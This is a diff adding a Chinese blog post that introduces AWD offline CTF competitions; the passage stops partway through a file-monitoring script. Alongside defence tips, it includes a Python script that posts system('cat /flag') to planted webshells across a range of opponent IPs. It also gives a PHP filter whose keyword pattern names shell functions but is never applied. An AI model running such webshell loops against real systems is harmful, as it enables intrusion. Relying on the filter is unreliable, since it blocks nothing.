@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="小技巧,CTF线下赛," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="防御先做好防御工作，否则一开始被打穿后面心态就容易崩 修改密码ssh密码修改 1sudo passwd user mysql密码修改 1mysql&amp;gt; SET PASSWORD FOR &amp;apos;user&amp;apos;@&amp;apos;localhost&amp;apos; = PASSWORD(&amp;apos;newpass&amp;apos;); web后台密码修改 直接在后台管理页面进行修改 当然有些情况是比赛">
+<meta name="keywords" content="小技巧,CTF线下赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="线下赛AWD模式初探">
+<meta property="og:url" content="http://eagerseven.cn/2018/06/26/线下赛AWD模式初探/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="防御先做好防御工作，否则一开始被打穿后面心态就容易崩 修改密码ssh密码修改 1sudo passwd user mysql密码修改 1mysql&amp;gt; SET PASSWORD FOR &amp;apos;user&amp;apos;@&amp;apos;localhost&amp;apos; = PASSWORD(&amp;apos;newpass&amp;apos;); web后台密码修改 直接在后台管理页面进行修改 当然有些情况是比赛">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fsor5ddnfrj312f0p0q4s.jpg">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.560Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="线下赛AWD模式初探">
+<meta name="twitter:description" content="防御先做好防御工作，否则一开始被打穿后面心态就容易崩 修改密码ssh密码修改 1sudo passwd user mysql密码修改 1mysql&amp;gt; SET PASSWORD FOR &amp;apos;user&amp;apos;@&amp;apos;localhost&amp;apos; = PASSWORD(&amp;apos;newpass&amp;apos;); web后台密码修改 直接在后台管理页面进行修改 当然有些情况是比赛">
+<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fsor5ddnfrj312f0p0q4s.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/06/26/线下赛AWD模式初探/"/>
+
+
+
+
+
+  <title>线下赛AWD模式初探 | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/06/26/线下赛AWD模式初探/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">线下赛AWD模式初探</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-26T20:08:00+08:00">
+                2018-06-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2,760
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>先做好防御工作，否则一开始被打穿后面心态就容易崩</p>
+<h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><p>ssh密码修改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd user</span><br></pre></td></tr></table></figure>
+<p>mysql密码修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET PASSWORD FOR &apos;user&apos;@&apos;localhost&apos; = PASSWORD(&apos;newpass&apos;);</span><br></pre></td></tr></table></figure>
+<p>web后台密码修改</p>
+<p>直接在后台管理页面进行修改</p>
+<p>当然有些情况是比赛不允许修改后台口令，会将修改后台口令视为宕机，还要被扣分</p>
+<h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><p>可以用Winscp、FileZilla之类的工具连接下载/var/www/html/下的文件做好备份</p>
+<h4 id="删除后门"><a href="#删除后门" class="headerlink" title="删除后门"></a>删除后门</h4><p>有些比赛主办方会在服务器预留后门，这时可以把备份目录用D盾之类的工具扫描一下，或者下载相同的cms来进行目录对比。有的话立刻删除，并且利用这个后门攻击其他服务器（很可能后门密码相同或者类似，可以猜解）</p>
+<p>参考<a href="http://tinyfisher.github.io/security/2017/10/02/CTF" target="_blank" rel="noopener">表哥</a>的脚本，修改其中的地址、shell路径和密码即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://192.168.71."</span></span><br><span class="line">url1=<span class="string">""</span></span><br><span class="line">shell=<span class="string">"/Upload/index.php"</span></span><br><span class="line">passwd=<span class="string">"abcde10db05bd4f6a24c94d7edde441d18545"</span> </span><br><span class="line">port=<span class="string">"80"</span></span><br><span class="line">payload = &#123;passwd: <span class="string">'system(\'cat /flag\');'</span>&#125;</span><br><span class="line">f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>) </span><br><span class="line">f1=open(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]: </span><br><span class="line">    url1=url+str(i)+<span class="string">":"</span>+port+shell</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">print</span> url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"shell 404"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> url1+<span class="string">" connect shell fail"</span></span><br><span class="line">		</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
+<h4 id="部署waf"><a href="#部署waf" class="headerlink" title="部署waf"></a>部署waf</h4><p>一般SQL注入之类的漏洞不会有过滤，可以部署waf来拖延对方时间。同理，可以在对方部署waf前利用sqlmap来跑</p>
+<p>上传漏洞也是简单的黑名单过滤，但是可以通过部署waf来删除常规木马，拖延对方的时间</p>
+<p>waf可以用安全狗linux版或者柠檬师傅发的:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$WAF_log = <span class="string">'/var/tmp/web_log_'</span>;</span><br><span class="line">$Upload_dir = <span class="string">'/var/tmp/upload/'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $Upload_dir;</span><br><span class="line">	<span class="keyword">if</span> (!function_exists(<span class="string">'getallheaders'</span>)) &#123;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">				<span class="keyword">if</span> (substr($name, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">					$headers[str_replace(<span class="string">' '</span>, <span class="string">'-'</span>, ucwords(strtolower(str_replace(<span class="string">'_'</span>, <span class="string">' '</span>, substr($name, <span class="number">5</span>)))))] = $value;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">unset</span>($header[<span class="string">'Accept'</span>]);</span><br><span class="line">			<span class="keyword">return</span> $headers;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$get = $_GET;</span><br><span class="line">	$get2 = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">	$post = $_POST;</span><br><span class="line">	$post2 = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">	$cookie = $_COOKIE;</span><br><span class="line">	$header = getallheaders();</span><br><span class="line">	$header[<span class="string">'url'</span>] = $_SERVER[<span class="string">'REQUEST_METHOD'</span>] . <span class="string">' '</span> . <span class="string">'http://'</span> . $_SERVER[<span class="string">'SERVER_NAME'</span>] . <span class="string">':'</span> . $_SERVER[<span class="string">"SERVER_PORT"</span>] . $_SERVER[<span class="string">"REQUEST_URI"</span>];</span><br><span class="line">	$files = $_FILES;</span><br><span class="line">	$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">	$method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];</span><br><span class="line">	$filepath = $_SERVER[<span class="string">"SCRIPT_NAME"</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($files)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			$files[$key][<span class="string">'content'</span>] = file_get_contents($_FILES[$key][<span class="string">'tmp_name'</span>]);</span><br><span class="line">			move_uploaded_file($_FILES[$key][<span class="string">'tmp_name'</span>], $Upload_dir . $_FILES[$key][<span class="string">"name"</span>] . <span class="string">'.'</span> . time());</span><br><span class="line">			file_put_contents($_FILES[$key][<span class="string">'tmp_name'</span>], <span class="string">"lemon"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>($header[<span class="string">'Accept'</span>]);</span><br><span class="line">	$input = <span class="keyword">array</span>(<span class="string">"Header"</span> =&gt; $header, <span class="string">"Get"</span> =&gt; $get, <span class="string">"Get2"</span> =&gt; $get2, <span class="string">"Cookie"</span> =&gt; $cookie, <span class="string">"Post"</span> =&gt; $post, <span class="string">"Post2"</span> =&gt; $post2, <span class="string">"File"</span> =&gt; $files);</span><br><span class="line">	logging($input);</span><br><span class="line">	$pattern = <span class="string">"/select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"</span>;</span><br><span class="line">	$pattern .= <span class="string">"|file_put_contents|fwrite|curl|system|eval|assert|file_get_contents"</span>;</span><br><span class="line">	$pattern .= <span class="string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span>;</span><br><span class="line">	$pattern .= <span class="string">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec/i"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $WAF_log;</span><br><span class="line">	$tmp = <span class="string">"\n["</span> . date(<span class="string">'y-m-d H:i:s'</span>) . <span class="string">"]\n"</span>;</span><br><span class="line">	<span class="keyword">foreach</span> ($var <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($v)) &#123;</span><br><span class="line">			$tmp .= $k . <span class="string">" : "</span> . print_r($v, <span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	file_put_contents($WAF_log . date(<span class="string">'H'</span>, time()), $tmp . <span class="string">"\n\r"</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">waf();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在PHP文件里include这个waf即可，要比<a href="http://www.safedog.cn/install_desc_website.html" target="_blank" rel="noopener">安全狗</a>麻烦点</p>
+<p>如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！ 添加require_once(‘waf.php’);来调用本代码</p>
+<p>常用php系统添加文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2   \config\config_global.php</span><br><span class="line">Wordpress   \wp-config.php</span><br><span class="line">Metinfo   \include\head.php</span><br></pre></td></tr></table></figure>
+<p>文件监控，会将新文件或者当文件被修改时立即恢复</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--</span></span><br><span class="line"><span class="comment"># v demo 0.21 修改了备份的webshell会自己坑自己的情况</span></span><br><span class="line"><span class="comment"># todo: windows下不支持中文目录</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></span><br><span class="line">bakstring = <span class="string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></span><br><span class="line">logstring = <span class="string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">webshellstring = <span class="string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">difffile = <span class="string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">'drops_log'</span>  <span class="comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">"utf-8"</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r"\?%02x"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">'log'</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">'difffile'</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span 